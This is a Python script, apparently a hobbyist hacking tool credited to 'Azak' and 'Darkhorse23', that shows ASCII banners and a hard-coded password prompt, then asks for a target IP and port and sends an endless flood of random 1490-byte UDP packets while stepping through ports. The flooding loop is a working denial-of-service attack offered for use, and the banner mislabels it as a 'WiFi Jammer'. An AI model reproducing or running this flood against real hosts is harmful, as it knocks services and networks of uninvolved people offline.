bir="\033[1;91m"        # Red
bb="\033[1;34m"        # Blue
import sys
import os
import time
import socket
import random

def logopsb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.003)

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print(bb)
print('''
  _   _ _____ _     _     ___  
 | | | | ____| |   | |   / _ \ 
 | |_| |  _| | |   | |  | | | |
 |  _  | |___| |___| |__| |_| |
 |_| |_|_____|_____|_____\___/                            
 ''')
print('''' \033[1;32m

                          __  __    _  _____ _____ 
                         |  \/  |  / \|_   _| ____|
                         | |\/| | / _ \ | | |  _|  
                         | |  | |/ ___ \| | | |___ 
                         |_|  |_/_/   \_\_| |_____|
                           
''')
print('-----------------------------------------------------------')
print()
print("              \033[1;91m Enter Username And Password")


print(bir)
usern='darkhorse23'
passwd='azakman'

inpuser=str(input("Username : "))
inppass=str(input("Password : "))

if usern==inpuser and passwd==inppass:
	print(" [✓] Welcome Mate ")
	pass
else:
		print("[x] Wrong User or Password !")
		sys.exit()

os.system("clear")
time.sleep(1)
print ("\033[1;36m")
time.sleep(0.6)
logopsb("""
                     _    
     /\             | |   
    /  \    ______ _| | __
   / /\ \  |_  / _` | |/ /
  / ____ \  / / (_| |   < 
 /_/    \_\/___\__,_|_|\_\
                          
                          
""")
print("\033[1;31m             ------X Fuck The System X------")
time.sleep(0.6)
psb("\n\n[!] Loading.....")
time.sleep(0.7)
psb("\n[!] Please Wait.....")
time.sleep(1)


print("\033[1;36m")
os.system("clear")
time.sleep(0.5)
logopsb("""
    ___         ____  ____            
   /   |       / __ \/ __ \____  _____
  / /| |______/ / / / / / / __ \/ ___/
 / ___ /_____/ /_/ / /_/ / /_/ (__  ) 
/_/  |_|    /_____/_____/\____/____/  
                                      
""")
logopsb("\033[1;33m           ------[A Tools Of Azak]------\033[1;33m")
print('')
print (' \033[1;32m Author   : \033[1;33m Darkhorse23')
print ('')
print (' \033[1;32m Tool     : \033[1;33m WiFi Jammer')
print ('')
print (' \033[1;32m Facebook : \033[1;33m https://www.facebook.com/Darkhorse23/')
print ('')
print (' \033[1;32m Github   : \033[1;33m https://www.github.com/Darkhorse23/')
print ('')
print (' \033[1;32m Coded By : \033[1;33m Azak')
print ('')
print ('\033[94m-'*50)


print
print("\033[1;31m")
ip = input("\033[1;31m[!] Target IP : ")
port = int(input("[-] Port      : "))

os.system("clear")
os.system("figlet DDos-Attack")
print("				A Tools of Azak\n")
print("[                    ] 0% ")
time.sleep(1)
print("[>>>>>               ] 25%")
time.sleep(1)
print("[>>>>>>>>>>          ] 50%")
time.sleep(1)
print("[>>>>>>>>>>>>>       ] 75%")
time.sleep(1)
print("[>>>>>>>>>>>>>>>>>>>>] 100%")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     sent2 = str(sent)
     port2 = str(port)
     print("Sent "+sent2+" packet to "+ip+" throught port:"+port2)
     if port == 65534:
       port = 1
print("\033[0;40m")
